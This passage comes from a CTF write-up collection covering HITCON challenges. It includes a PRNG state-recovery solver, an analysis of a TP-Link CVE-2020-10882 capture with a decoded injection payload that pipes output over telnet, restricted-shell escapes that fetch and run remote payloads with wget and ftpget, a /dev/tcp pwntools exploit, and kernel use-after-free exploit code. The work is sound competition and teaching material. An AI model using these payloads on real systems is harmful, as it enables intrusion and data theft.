    double_bits = (value >> 12) | 0x3FF0000000000000
    return struct.unpack('d', struct.pack('<Q', double_bits))[0] - 1


def from_double(dbl):
    return struct.unpack('<Q', struct.pack('d', dbl + 1))[0] & 0x7FFFFFFFFFFFFFFF


def proof_of_work(prefix):
    c = 0
    while True:
        guess = str(c)
        calculated = hashlib.sha256((prefix+guess).encode()).hexdigest()
        if calculated.endswith('00000'):
            print('found', guess, calculated)
            return guess.encode()
        c += 1
        if not c%10**6: print(c)

alphabet = '1234567890'
origin = list(filter(lambda k: len(set(k)) == 4 and len(k) == 4, [("0000" + str(i))[-4:] for i in range(10000)]))
special = ''.join([str(i) * (pow(2, (i-1))) for i in range(1,10)])

class Solver:
    def __init__(self):
        self.found = []
        self.possibilities = []
        self.foundPermutations = False

    def getOne(self):
        if self.foundPermutations:
            return self.possibilities.pop()
        else:
            return special

    def parseResult(self, x, a, b):
        if self.foundPermutations and a + b == 4:
            if a == 0:
                self.possibilities = [i for i in self.possibilities if not any([i[k] == x[k] for k in range(4)])]
            else:
                self.possibilities = [i for i in self.possibilities if sum([i[k] == x[k] for k in range(4)]) == a]
        elif a + b > 4:
            h = (bin(a + b)[2:])[::-1]
            h += '0000000000'
            p = ''
            for i in range(1,10):
                if h[i-1] == '1':
                    p += str(i)
            if len(p) == 3:
                p += '0'
            self.possibilities = list([''.join(list(l)) for l in permutations(p, 4)])
            shuffle(self.possibilities)
            self.foundPermutations = True

    def pinFound(self, x):
        self.found.append(x)
        self.possibilities = []
        self.foundPermutations = False


def guess_random(proc):
    pin = ''
    i = 0
    tries = 0
    guesser = Solver()
    while tries <= 40 and i < 11:
        proc.recvuntil(b'?')
        pin = guesser.getOne()
        proc.sendline(pin)
        res = proc.recvline()
        # print(res)
        tries += 1
        if b'U' in res:
            exit(0)
        elif b'O' in res:
            i += 1
            guesser.pinFound(pin)
            print(pin, ";", i, "after", tries, "tries")
            continue
        else:
            [a, b] = (res.split()[-1]).split(b'A')
            a = int(a)
            b = int(b[:-5])
            guesser.parseResult(pin, a, b)
    # print("tries:", tries)
    # print(guesser.found)
    return [origin.index(x) for x in guesser.found]

def derivePins(points, multiple = 5040, lead = 0):
    solutions = []
    state0, state1 = solve_random(points[::-1], multiple, lead)

    print('[+] recovered state:', state0, state1)
    saved_state0, saved_state1 = state0, state1

    partial = []
    for _ in range(11):
        state0, state1, output = xs128p(state0, state1)
        partial.append(math.floor(multiple * to_double(state0)))
    solutions += partial[::-1]

    state0, state1 = saved_state0, saved_state1
    solutions.append(math.floor(multiple * to_double(state0)))
    for _ in range(64):
        state0, state1, output = reverse_xs128p(state0, state1)
        solutions.append(math.floor(multiple * to_double(output)))
    solutions = solutions[:64]
    state0, state1 = saved_state0, saved_state1

    partial = []
    for _ in range(10):
        state0, state1, output = xs128p(state0, state1)
    for i in range(65):
        state0, state1, output = xs128p(state0, state1)
        out = math.floor(multiple * to_double(output))
        partial.append(out)
    solutions += partial[::-1]
    solutions = solutions[:100]
    return [origin[idx] for idx in solutions]

def solve(proc):
    proc.recvuntil(b'Show me sha256("')
    prefix = proc.recvuntil(b'"')[:-1].decode()
    proc.recvuntil(b'ends with "00000": ')
    guess = proof_of_work(prefix)
    proc.sendline(guess)
    # start the guessing of pins
    randoms = guess_random(proc)
    # if we don't have enough pins we retry
    if len(randoms) != 11:
        print("We have ", len(randoms))
        raise Exception('yeet')
    print("#################")
    print("#################")
    print("#################")
    print("#################")
    # now we recover the states and next pins
    print(randoms)
    pins = derivePins(randoms)[len(randoms):]

    r = ''
    # we input all the pins
    for i in pins:
        proc.sendline(i)
        print(proc.recvline())
    # we get the flag
    proc.interactive()
    return False

def main():
    x = True
    while x:
        try:
            host, port = '18.183.134.249', 1234
            with remote(host, port) as proc:
                x = solve(proc)
        except Exception as e:
            print(e)

main()
```

### Execution

With a lot of luck

```
[+] Opening connection to 18.183.134.249 on port 1234: Done
found 332260 2030edc98d041ec0159f1e75a0cecacca4028f83572e34fb0f35761919a00000
2981 ; 1 after 4 tries
7109 ; 2 after 6 tries
9250 ; 3 after 11 tries
0256 ; 4 after 16 tries
9580 ; 5 after 19 tries
7129 ; 6 after 23 tries
8697 ; 7 after 26 tries
8037 ; 8 after 28 tries
4286 ; 9 after 32 tries
3416 ; 10 after 35 tries
3798 ; 11 after 39 tries
#################
#################
#################
#################
[1506, 3590, 4676, 80, 4865, 3597, 4423, 4051, 2174, 1690, 1903]
[+] recovered state: 5977170398082918709 6965505899860868137
b'Pin 12? \x1b[1;32mOK\x1b[0m\n'
b'Pin 13? \x1b[1;32mOK\x1b[0m\n'
b'Pin 14? \x1b[1;32mOK\x1b[0m\n'
b'Pin 15? \x1b[1;32mOK\x1b[0m\n'
b'Pin 16? \x1b[1;32mOK\x1b[0m\n'
b'Pin 17? \x1b[1;32mOK\x1b[0m\n'
b'Pin 18? \x1b[1;32mOK\x1b[0m\n'
b'Pin 19? \x1b[1;32mOK\x1b[0m\n'
b'Pin 20? \x1b[1;32mOK\x1b[0m\n'
b'Pin 21? \x1b[1;32mOK\x1b[0m\n'
b'Pin 22? \x1b[1;32mOK\x1b[0m\n'
b'Pin 23? \x1b[1;32mOK\x1b[0m\n'
b'Pin 24? \x1b[1;32mOK\x1b[0m\n'
b'Pin 25? \x1b[1;32mOK\x1b[0m\n'
b'Pin 26? \x1b[1;32mOK\x1b[0m\n'
b'Pin 27? \x1b[1;32mOK\x1b[0m\n'
b'Pin 28? \x1b[1;32mOK\x1b[0m\n'
b'Pin 29? \x1b[1;32mOK\x1b[0m\n'
b'Pin 30? \x1b[1;32mOK\x1b[0m\n'
b'Pin 31? \x1b[1;32mOK\x1b[0m\n'
b'Pin 32? \x1b[1;32mOK\x1b[0m\n'
b'Pin 33? \x1b[1;32mOK\x1b[0m\n'
b'Pin 34? \x1b[1;32mOK\x1b[0m\n'
b'Pin 35? \x1b[1;32mOK\x1b[0m\n'
b'Pin 36? \x1b[1;32mOK\x1b[0m\n'
b'Pin 37? \x1b[1;32mOK\x1b[0m\n'
b'Pin 38? \x1b[1;32mOK\x1b[0m\n'
b'Pin 39? \x1b[1;32mOK\x1b[0m\n'
b'Pin 40? \x1b[1;32mOK\x1b[0m\n'
b'Pin 41? \x1b[1;32mOK\x1b[0m\n'
b'Pin 42? \x1b[1;32mOK\x1b[0m\n'
b'Pin 43? \x1b[1;32mOK\x1b[0m\n'
b'Pin 44? \x1b[1;32mOK\x1b[0m\n'
b'Pin 45? \x1b[1;32mOK\x1b[0m\n'
b'Pin 46? \x1b[1;32mOK\x1b[0m\n'
b'Pin 47? \x1b[1;32mOK\x1b[0m\n'
b'Pin 48? \x1b[1;32mOK\x1b[0m\n'
b'Pin 49? \x1b[1;32mOK\x1b[0m\n'
b'Pin 50? \x1b[1;32mOK\x1b[0m\n'
b'Pin 51? \x1b[1;32mOK\x1b[0m\n'
b'Pin 52? \x1b[1;32mOK\x1b[0m\n'
b'Pin 53? \x1b[1;32mOK\x1b[0m\n'
b'Pin 54? \x1b[1;32mOK\x1b[0m\n'
b'Pin 55? \x1b[1;32mOK\x1b[0m\n'
b'Pin 56? \x1b[1;32mOK\x1b[0m\n'
b'Pin 57? \x1b[1;32mOK\x1b[0m\n'
b'Pin 58? \x1b[1;32mOK\x1b[0m\n'
b'Pin 59? \x1b[1;32mOK\x1b[0m\n'
b'Pin 60? \x1b[1;32mOK\x1b[0m\n'
b'Pin 61? \x1b[1;32mOK\x1b[0m\n'
b'Pin 62? \x1b[1;32mOK\x1b[0m\n'
b'Pin 63? \x1b[1;32mOK\x1b[0m\n'
b'Pin 64? \x1b[1;32mOK\x1b[0m\n'
b'Pin 65? \x1b[1;32mOK\x1b[0m\n'
b'Pin 66? \x1b[1;32mOK\x1b[0m\n'
b'Pin 67? \x1b[1;32mOK\x1b[0m\n'
b'Pin 68? \x1b[1;32mOK\x1b[0m\n'
b'Pin 69? \x1b[1;32mOK\x1b[0m\n'
b'Pin 70? \x1b[1;32mOK\x1b[0m\n'
b'Pin 71? \x1b[1;32mOK\x1b[0m\n'
b'Pin 72? \x1b[1;32mOK\x1b[0m\n'
b'Pin 73? \x1b[1;32mOK\x1b[0m\n'
b'Pin 74? \x1b[1;32mOK\x1b[0m\n'
b'Pin 75? \x1b[1;32mOK\x1b[0m\n'
b'Pin 76? \x1b[1;32mOK\x1b[0m\n'
b'Pin 77? \x1b[1;32mOK\x1b[0m\n'
b'Pin 78? \x1b[1;32mOK\x1b[0m\n'
b'Pin 79? \x1b[1;32mOK\x1b[0m\n'
b'Pin 80? \x1b[1;32mOK\x1b[0m\n'
b'Pin 81? \x1b[1;32mOK\x1b[0m\n'
b'Pin 82? \x1b[1;32mOK\x1b[0m\n'
b'Pin 83? \x1b[1;32mOK\x1b[0m\n'
b'Pin 84? \x1b[1;32mOK\x1b[0m\n'
b'Pin 85? \x1b[1;32mOK\x1b[0m\n'
b'Pin 86? \x1b[1;32mOK\x1b[0m\n'
b'Pin 87? \x1b[1;32mOK\x1b[0m\n'
b'Pin 88? \x1b[1;32mOK\x1b[0m\n'
b'Pin 89? \x1b[1;32mOK\x1b[0m\n'
b'Pin 90? \x1b[1;32mOK\x1b[0m\n'
b'Pin 91? \x1b[1;32mOK\x1b[0m\n'
b'Pin 92? \x1b[1;32mOK\x1b[0m\n'
b'Pin 93? \x1b[1;32mOK\x1b[0m\n'
b'Pin 94? \x1b[1;32mOK\x1b[0m\n'
b'Pin 95? \x1b[1;32mOK\x1b[0m\n'
b'Pin 96? \x1b[1;32mOK\x1b[0m\n'
b'Pin 97? \x1b[1;32mOK\x1b[0m\n'
b'Pin 98? \x1b[1;32mOK\x1b[0m\n'
b'Pin 99? \x1b[1;32mOK\x1b[0m\n'
b'Pin 100? \x1b[1;32mOK\x1b[0m\n'
[*] Switching to interactive mode
FLAG Unlocked: hitcon{even_my_c4t_can_s0lve_4_digits_pin_4A999B}
[*] Got EOF while reading in interactive
```


AC1750
--------

> My router is weird, can you help me find the problem?

### The challenge

We are given a PCAP file which contains some communication between a computer (a macbook pro) and a router (a TP-link AC1750)


### The PCAP

The PCAP can be divided into 3 main flows, one after the other:

1. Some HTTP requests to the router web interface, which seems to be running
   some sort of OpenWRT, given the references to the LuCI API. Nothing too
   interesting here
2. Some weird UDP traffic from the computer to port 20002 of the router which
   appears to be encrypted (high entropy, no recognizable strings)
3. A TCP connection from the router to the computer on port 4321, which sends
   back the output of the `ls` command

### UDP port 20002

From a quick search on the internet, we find references to
[CVE-2020-10882](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10882),
which coincidentally affects the router we are communicating with.

We were able to find
[this extremely useful writeup](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo)
which explains the details of the protocol, and of the vulnerability which
causes RCE. TLDR (since it's what we care about): it communicates using packets
containing a 32-byte header and a JSON encrypted with AES-128 CBC, with the
fixed key `TPONEMESH_Kf!xn?` and IV `1234567890abcdef1234567890abcdef`.

Without knowing anything else about the protocol (except that the injection
point is in the slave_mac JSON key), we exported the UDP traffic from wireshark
as JSON and wrote this quick python script:

```python
from Crypto.Cipher import AES

def decrypt(packet_hex):
	c = AES.new(b'TPONEMESH_Kf!xn?',AES.MODE_CBC,b'1234567890abcdef')
	enc = bytearray.fromhex(packet_hex[32:])
	return c.decrypt(enc)


import json

f = json.loads(open("traffic.json").read())
for p in f:
	try:
		p = p['_source']['layers']['udp']['udp.payload'].replace(':',"") #because wireshark hexdump is stupid
		print(json.loads(decrypt(p))['data']['slave_mac'][2:-1])
	except Exception as e:
		pass
```

Which, after a bit of cleaning, this returned
```bash
echo>f;
printf '('>>f;
printf 'l'>>f;
printf 's'>>f;
printf ' '>>f;
printf '-'>>f;
printf 'l'>>f;
printf '&'>>f;
printf '&'>>f;
printf 'e'>>f;
printf 'c'>>f;
printf 'h'>>f;
printf 'o'>>f;
printf ' '>>f;
printf 'h'>>f;
printf 'i'>>f;
printf 't'>>f;
printf 'c'>>f;
printf 'o'>>f;
printf 'n'>>f;
printf '{'>>f;
printf 'W'>>f;
printf 'h'>>f;
printf 'y'>>f;
printf '_'>>f;
printf 'c'>>f;
printf 'a'>>f;
printf 'n'>>f;
printf '_'>>f;
printf 'o'>>f;
printf 'n'>>f;
printf 'e'>>f;
printf '_'>>f;
printf 'p'>>f;
printf 'l'>>f;
printf 'a'>>f;
printf 'c'>>f;
printf 'e'>>f;
printf '_'>>f;
printf 'b'>>f;
printf 'e'>>f;
printf '_'>>f;
printf 'i'>>f;
printf 'n'>>f;
printf 'j'>>f;
printf 'e'>>f;
printf 'c'>>f;
printf 't'>>f;
printf 'e'>>f;
printf 'd'>>f;
printf '_'>>f;
printf 't'>>f;
printf 'w'>>f;
printf 'i'>>f;
printf 'c'>>f;
printf 'e'>>f;
printf '}'>>f;
printf '>'>>f;
printf 'f'>>f;
printf 'l'>>f;
printf 'a'>>f;
printf 'g'>>f;
printf '&'>>f;
printf '&'>>f;
printf 'l'>>f;
printf 's'>>f;
printf ' '>>f;
printf '-'>>f;
printf 'l'>>f;
printf ')'>>f;
printf '|'>>f;
printf 't'>>f;
printf 'e'>>f;
printf 'l'>>f;
printf 'n'>>f;
printf 'e'>>f;
printf 't'>>f;
printf ' '>>f;
printf '1'>>f;
printf '9'>>f;
printf '2'>>f;
printf '.'>>f;
printf '1'>>f;
printf '6'>>f;
printf '8'>>f;
printf '.'>>f;
printf '0'>>f;
printf '.'>>f;
printf '1'>>f;
printf '0'>>f;
printf '5'>>f;
printf ' '>>f;
printf '4'>>f;
printf '3'>>f;
printf '2'>>f;
printf '1'>>f;
sh f;
```

Which, when executed, creates the file `f` containining:

```bash
(ls -l && echo hitcon{Why_can_one_place_be_injected_twice}>flag &&l s -l)|telnet 192.168.0.105 4321
```

Which contains the flag!


Baby Shock
----------

> `nc 54.248.135.16 1986`

### The challenge

We can connect via netcat to a machine, which contains an extremely limited shell, where the only commands we can run are `pwd ls mkdir netstat sort printf exit help id mount df du find history touch
` and (most of the) special characters are filtered

### The solution

For some reason, `;` is not filtered. This means that we can run any command by
doing `id ; mycommand`, as long as mycommand does not contain special characters
(such as `-`, so most flags are forbidden).

Also, the `.` is restricted, and cannot appear more than once in a command.

So first we execute:

```bash
id ; wget 123456789
```

where 123456789 is the IP (encoded as decimal number) of a HTTP serve we
control, that hosts an index.html containing shell commands.

We then execute it via the command:

```
id ; sh index.html
```

Which allows us to explore the filesystem, and see that there is a `readFlag`
binary in `/`. By executing it we get the flag.


Revenge of Baby Shock
---------------------

> `nc 18.178.60.6 1987`

### The challenge

It's identical to baby shock, but more characters are forbidden, including `;`
and even a single `.`

### The solution

One of the (very few) special characters allowed are `()`. With these, it's
possible to declare functions.

This means that we can do
```bash
> id () whoami
> id
whoami: unknown uid 1129
```

To redefine one of the allowed commands (in this case `id`) to a function that
executes our desired command.

Without the `.`, we couldn't use the same trick as before to execute the reverse
shell, as wget by default saves the downloaded files as `index.html` (and to
change that name, a flag starting with `-` is required).

Luckily, the server was running busybox, which contains the `ftpget` utility,
with the much simper syntax of `ftpget HOST LOCAL_FILE REMOTE_FILE`.

So we run the following commands

```bash
id () ftpget 123456789 payload payload
id
```

to download via FTP the payload file from our server with ip 123456789 (decimal
encoded), which contains the command `/readFlag`, and then

```
id () sh payload
id
```

To execute it and read the flag, which is
`hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}`.


Revenge of Pwn
--------------

> Have you ever thought those challenges you pwned may retaliate someday?
>
> `nc 3.115.58.219 9427`

### The challenge

Our task is to write an exploit to "pwn" a
[`pwntools`](https://github.com/Gallopsled/pwntools) Python script that runs on
the remtoe server. When we connect, we can upload an executable: this executable
is then saved and exposed in the local on port 1337. Then, the Python script is
started. Our executable does not have the right to read the flag, which is at
`/home/deploy/flag`, but the Python script does. We need to find a way to make
it read and spit out that file.

The Python script does the following:

1. Start listening on port 31337.
2. Expect to receive a string containing a stack address
   (`stack address @ 0xXXX`) from the program right away.
3. Prepare and send a shellcode to our program. The shellcode is meant to leak
   an `fd` number from the stack and send it back as a decimal string to the
   Python script by conencting back to port 31337. The code sends the `fd`
   number followed by a `@` character.
4. Receive the leaked `fd` on port 31337, using `s.recvuntil('@')`.
5. Use the value to craft some more shellcode which is then sent to our program.

### The vulnerability

When receiving the `fd` number, the Python script treats it as a string without
converting it to integer. When passing the string to the `shellcraft` function
of `pwntools`, this value is directly inserted into an assembly program that is
then passed to `cpp` (compiler) to evaluate preprocessor macros and then to `as`
(assembler) to assemble it into the actual shellcode.

Since we have control on the "vulnerable" program that the script tries to
connect to, after sending a fake stack address, we can just connect back to the
script on port 31337 and send an arbitrary string followed by `@`. This string
will then be passed to `shellcraft`, and it ends up in the middle of the
assembly program that is being compiled into shellcode.

### The exploit

The remote server says `ELF size? (MAX: 6144)` when connecting, which makes it
seems like it only accepts an ELF file. Sure, we could craft a very simple ELF
that does a write plus connect, no big deal. However, we can send any kind of
file and the serer will mark it as executable. We can therefore just send a Bash
script as executable and make our life 10 times easier.

Now in our executable we could just send `.incbin "/home/deploy/flag"` and have
`as` include the flag as raw bytes in the resulting shellcode that is then sent
back to us, but `pwntools`
[makes some very strict sanity checks](https://github.com/Gallopsled/pwntools/blob/stable/pwnlib/util/safeeval.py#L46)
on our string before actually inserting it into the assembly. Our string can
only be a valid Python expression: it is compiled using
[`compile()`](https://docs.python.org/3/library/functions.html#compile) and the
resulting bytecode is checked against a whitelist of Python opcodes before being
evaluated and inserted in the assembly. Long story short, we nee to pass this
check and cannot just send arbitrary stuff.

Since the assembly will be parsed by `cpp`, it can contain valid C preprocessor
directives, like for example `#include`. Luckily, `#` in Python delimits the
start of a comment, which is completely ignored by `compile()`. We can therefore
send a number followed by a newline and then `#include </home/deploy/flag>@`.

Here's the complete exploit:

```bash
#!/bin/bash
# @mebeim - 2020-11-29

{
cat <<EOF
122
#!/bin/bash

echo 'stack address @ 0x1234'
sleep 1
echo -e '123\n#include "/home/deploy/flag"@' > /dev/tcp/127.0.0.1/31337
EOF
} > /dev/tcp/3.115.58.219/9427
```

This will result in the remote `pwntools` trying to compile something like this:

```
    push 123
#include </home/deploy/flag>
    push 16384
```

Which will make `cpp` include the flag in the file. Afterwards, when passing the
file to `as`, it will die because the source is invalid, and make `pwntools`
dump the script and the flag to `stderr`:

```
[ERROR] An error occurred while assembling:
       1: .section .shellcode,"awx"
       2: .global _start
       3: .global __start
       4: _start:
       5: __start:
       6: .intel_syntax noprefix
       7: stager_3:
       8:     push 123
       9: hitcon{use_pwntools_to_pwn_pwntools_^ovo^}
      10:     push 16384
...
...
/var/tmp/pwn-asm-bslk3jq9/step1:9: Error: no such instruction: `hitcon{use_pwntools_to_pwn_pwntools_^ovo^}'
```


Atoms
-----

> A TOken-based Memory Storage.
>
> nc 13.231.7.116 9427

### Challenge Release Content

|              file | comment                                |
| -----------------:| -------------------------------------- |
|            run.sh | bash script to run the challenge       |
|        linux.diff | a patch that was applied to the kernel |
| initramfs.cpio.gz | the system (binaries, libraries, etc.) |
|            demo.c | source code of the test module         |
|              demo | a sample binary to test the module     |
|           bzImage | the kernel                             |
|          atoms.ko | the kernel module loaded on the system |

### The Goal of the Challenge

There was no flag file. The goal of the challenge was not standard. But looking
at the released file was easy to understand the goal of the challenge. In
particular, the `linux.diff` tells us that the flag is stored in the kernel's
error messages.

```diff
index 7110906..beeb01f 100644
--- a/kernel/watchdog.c
+++ b/kernel/watchdog.c
@@ -409,9 +409,12 @@ static enum hrtimer_restart watchdog_timer_fn(struct hrtimer *hrtimer)
 			}
 		}

+#ifndef FLAG
+ #define FLAG "hitcon{<FLAG WILL BE HERE>}"
+#endif
 		pr_emerg("BUG: soft lockup - CPU#%d stuck for %us! [%s:%d]\n",
 			smp_processor_id(), duration,
-			current->comm, task_pid_nr(current));
+			FLAG, task_pid_nr(current));
 		print_modules();
 		print_irqtrace_events(current);
 		if (regs)
```

Looking at the kernel's
[original source code](https://elixir.bootlin.com/linux/latest/source/kernel/watchdog.c#L341),
we understood that the error is triggered if the core is stacked for a certain
amount of time. In practice, you need to get the kernel module in deadlock.

### The Kernel Module

This kernel module (`atomos.ko`) is creating a new device file `/dev/atoms`. It
easy to understand the basic functionality of the module from the demo source
code.

Practically, you can **open** the device file:

```c
  int fd = open(DEV_PATH, O_RDWR);
```

**Select/Create** storage indexed by a `key`:

```c
  ioctl(fd, ATOMS_USE_TOKEN, TOKEN)
```

**Allocate** space for you messages:

```c
  struct atoms_ioctl_alloc arg = {
    .size = 0x1000,
  };
  assert(ioctl(fd, ATOMS_ALLOC, &arg) == 0);
```

**Map** the storage to a userspace virtual address:

```c
  void *ptr = mmap(0, 0x1000, PROT_WRITE, MAP_SHARED, fd, 0);
```

When memory is allocated in userspace, you can **read or write** it:

```c
  strcpy((char*)ptr, "the secret message left by parent");
```

**Remove** the storage from userspace:

```c
  munmap(ptr, 0x1000);
```

**Close** the file descriptor:

```c
  close(fd);
```

The `ioctl` function is the most interesting part. We spent some time to reverse
engineer the details. There are 4 basic commands for `ioctl`.

```
ATOMS_USE_TOKEN    0x4008D900  // set the current pool to a token
ATOMS_ALLOC        0xC010D902  // allocate memory for current pool
ATOMS_RELEASE      0xD903      // clean up the pool
ATOMS_INFO         0x8018D901  // return info about the current pool
```

The module internally has the concept of `pool`. A `pool` is identified by a
`token` and contains the messages (memory pages) corresponding to a specific
`token` The kernel has a global variable that is an array of pools. It can store
up to 1024 pools.

#### The Locks

The module uses the kernel function `raw_spin_lock` to set up a lock on several
resources. We identified three types of locks:

- `fd_lock`: This is a locking done on a file descriptor. The resource is stored
  in `priv_data` of the fd kernel structure.
- `pools_lock`: This lock is done when accessing the global variable array
  containing all the pools. This resource is stored as a global variable as well.
- `tk_lock`: A lock that is used to control access to a specific `pool`/`token`.
  This resource is store as part of the `pool` structure.

#### The Ref Counter

Internally, the `pool` is a structure that looks like this:

```c=
struct __attribute__((aligned(8))) s_pool
{
  _QWORD token;
  __int32 ref_counter;
  _DWORD lock;
  msg msgs[16];
};
```

`token` is the identifier of the pool, `lock` is the resource used for locking
mechanism. `msgs` are the pages/messages stored in the pool.

`ref_counter` is counting how many *things* have a reference to this pool. The
`ref_counter` is set to one when the pool is selected with the token. When
`ref_counter` reaches zero, all `pool` contents are set free (`atoms_mem_put`).
Ideally should reach zero only when the `fd` is closed. mapping a page increase
the counter by 1, unmapping a page decrease the counter by 1.

### The (Unintented) Vulnerability.

The challenge's obvious goal was to get some of the locks interleaved to end up
in a deadlock. We did not find such a combination. There is an exploit with the
intended solution posted by the author david942j. At the time of writing, I
(jinblack) do not understand that exploit. We exploited a User After Free that
we stumbled on while experimenting.

If you map a message with multiple pages, the `ref_counter` is increased by 1.
If you unmap pages singularly, each `munmap` decrease the counter by 1. This
allows us to get the counter to zero even if the `fd` is not closed yet.

When the `ref_counter` reaches 0, the structure containing information of the
selected token is set free. But because the `fd` is still alive, we can keep
doing operations with that pool.

With this vulnerability, our focus changed from getting a **deadlock** to crash
the kernel to just **crash** the kernel.

### The Exploit

We modified the `demo.c` program to:

- **allocate** multiple pages.
- **deallocate** pages singularly until `ref_counter` reaches 0,
- **spawn** several children that use the module.
- **monitor** if the values in the current chunk change with `ATOMS_INFO`.
- when the value changes, we just try to **use** the module, expecting a crash.

The exploit is not 100% reliable. It happens (quite often) that the program
terminates without a crash. We just run the program several times.

```c
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdint.h>

#define ATOMS_USE_TOKEN    0x4008D900
#define ATOMS_ALLOC        0xC010D902
#define ATOMS_RELEASE         0xD903
#define ATOMS_INFO         0x8018D901

struct atoms_ioctl_alloc {
  uint64_t size;
  uint64_t unk;
};

struct atoms_ioctl_info {
  uint64_t token;
  uint64_t num;
  uint64_t index;
};

#define DEV_PATH "/dev/atoms"
#define TOKEN 0xdeadbeef

static void print_info(int fd){
  struct atoms_ioctl_info arg= {
    .token = 0x0,
    .num = 0x0,
    .index = 0x0,
  };
  assert(ioctl(fd, ATOMS_INFO, &arg) == 0);
  printf("token: %lx\t num %lx\t index %lx\n", arg.token, arg.num, arg.index);

}

static int get_token(int fd){
  struct atoms_ioctl_info arg= {
    .token = 0x0,
    .num = 0x0,
    .index = 0x0,
  };
  assert(ioctl(fd, ATOMS_INFO, &arg) == 0);
  return arg.token;
}

static void hex_printer(uint8_t *c, int size){
  for(int i=0; i < size; i++){
    printf("%02x ", c[i]);
  }
  puts("");
}

static int open_atoms(){
  int fd = open(DEV_PATH, O_RDWR);
  assert(fd >= 0);
  return fd;
}

static void set_token(int fd, uint64_t token){
  assert(ioctl(fd, ATOMS_USE_TOKEN, token) == 0);
}

static void set_token_noa(int fd, uint64_t token){
  printf("s_token %x\n", ioctl(fd, ATOMS_USE_TOKEN, token));
}


static void alloca_size(int fd, uint32_t size){
  struct atoms_ioctl_alloc arg = {
    .size = size,
  };
  assert(ioctl(fd, ATOMS_ALLOC, &arg) == 0);
}

static void *mappa(int fd, uint64_t size){
  void *ptr = mmap(0, size, PROT_WRITE | PROT_READ, MAP_SHARED, fd, 0);
  printf("mem: %p\n", ptr);
  assert(ptr != MAP_FAILED);
  return ptr;
}

static void release(int fd){
    assert(ioctl(fd, ATOMS_RELEASE) == 0);
}

static void fill_a_token(uint64_t token, int size){
  int fd = open_atoms();
  set_token(fd, token);

  for (int i=0; i < 16; i++)
    alloca_size(fd, size);
}


static void child_work() {
  printf("[child] start\n");
  int fd = open_atoms();
  set_token(fd, 0x41424344);
  char *ptr = mappa(fd, 0x1000);
  printf("mem: %p\n", ptr);

  release(fd);
  munmap(ptr, 0x1000);
  close(fd);
}

static void parent_work(int argc, char *argv[]) {
  int fd = open_atoms();
  puts("before set token");
  set_token(fd, TOKEN);

  // allocate a multiple pages chunk
  alloca_size(fd, 0x5000);
  uint8_t *ptr = mappa(fd, 0x5000);
  hex_printer(ptr, 0x10);
  strcpy((char*)ptr, "AAAAAAAAAAAAAAAAAAAAB");

  // deallocate page singularly to get ref count below 1
  printf("before munmap 1 \n");
  munmap(ptr + 0x1000, 0x1000);

  printf("before munmap 2 \n");
  munmap(ptr + 0x2000, 0x1000);

  puts("before release!");
  release(fd); //Here you could use another munmap. It should work as well.

  //At this point the priv_data of the file descriptor is pointing to a free chunk

  int i = 1;
  while (1)
  {
    int pid = fork();
    //Spawn several child to get the free chunk allocated
    if(pid == 0){
      char * newarg[] = { argv[0], "child", NULL };
      execv(argv[0], newarg);
      puts("neve executed!");
    }

    //checks that the chunk is been written with something else
    if (get_token(fd) != TOKEN){
      puts("daje!");

      //Try to run stuff to get a crash!
      print_info(fd);
      alloca_size(fd, 0x1000);
      mappa(fd, 0x1000);
    }
  }

  puts("before close");
  close(fd);

  puts("[parent] Message left.");
}

int main(int argc, char *argv[]) {
  if (argc == 1) {
    parent_work(argc, argv);
  } else {
    child_work();
  }
  return 0;
}
```

### The Setup

I believe a nice setup is one of the most important and useful things to solve a
CTF challenge. I was a little rusty (a better word for noob) with qemu machines.
I am putting the setup scripts in this section so that the future me, which will
still be rusty with qemu machines, can quickly readapt those scripts during
another CTF. Credits for compilation setup go to mebeim.

#### Run machine recompiling my sourcecode

```bash
#!/bin/bash

# Uncompress, make changes, recompress
# mkdir initramfs
# cd initramfs
# zcat ../initramfs.cpio.gz | cpio -i -d
# ... edit stuff
# find . | cpio -o -H newc | gzip -9 > ../initramfs_edited.cpio.gz

set -e

gcc  -static -g \
  -o initramfs/home/atoms/expl expl.c
cp expl.c initramfs/home/atoms/expl.c
cd initramfs
find . | cpio -o -H newc | gzip -9 > ../initramfs_edited.cpio.gz
cd ..

qemu-system-x86_64 \
  -s \
  -kernel ./bzImage \
  -initrd ./initramfs_edited.cpio.gz \
  -nographic \
  -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=-1 softlockup_panic=1" \
  -no-reboot \
  -m 256M -smp cores=2 \
  -device e1000,netdev=network0 \
  -netdev tap,id=network0,ifname=tap0,script=no,downscript=no \
  -monitor none
```

`-s` is for enableing gdbserver on the kernel.

```
-device e1000,netdev=network0 \
-netdev tap,id=network0,ifname=tap0,script=no,downscript=no \
```

To enable network communication between gest and host. You also need the network
setup script and assign an IP in the machine. I achieved the IP assignment by
modifying the init script of the initramfs. `nokaslr` as kernel option to
disable kaslr. `cat /proc/kallsyms` from inside the vm to get position of
functions inside the kernel.

#### Setup network for debugging

I needed the network setup from the host and the guest in order to run a
gdbserver on the executable inside the vm.

```bash
#!/bin/sh

sudo ip link add br0 type bridge
sudo ip addr flush dev br0
# Assign IP to the bridge.
sudo ip addr add 192.168.100.50/24 brd 192.168.100.255 dev br0

#reate TAP interface.
sudo ip tuntap add mode tap user $(whoami)
ip tuntap show

#Add TAP interface to the bridge.
sudo ip link set tap0 master br0

#Make sure everything is up
sudo ip link set dev br0 up
sudo ip link set dev tap0 up

# DELETE
# sudo ip link set dev br0 down
# sudo ip link set dev tap0 down
# sudo ip link del br0
# sudo ip link del tap0
```

Inside `./initramfs/init`:

```bash
ifconfig eth0 up
ip addr add 192.168.100.51/24 broadcast 192.168.100.255 dev eth0
```


Tenet
-----

> You have to start looking at the world in a new way.
>
> nc 52.192.42.215 9427
>
> Author: david942j

### The Goal of the Challenge

The challenge is based on the `server.rb` ruby script which takes a shellcode as
input and wraps it into an ELF executable file that is then run by the
`time_machine` debugger. The goal of the challenge was to initially reverse this
debugger and learn what it exactly does. Later on we found out that in order to
retrieve the flag the shellcode needed to be executable in two ways: the normal
and the reversed one. The peculiarity was that the code would run reversed
following the same flow it got in the 'straight' way.

### The generated ELF

First of all we wanted to test out what kind of wrapping was in place within our
shellcode, we found out that seccomp was enabled preventing us from executing
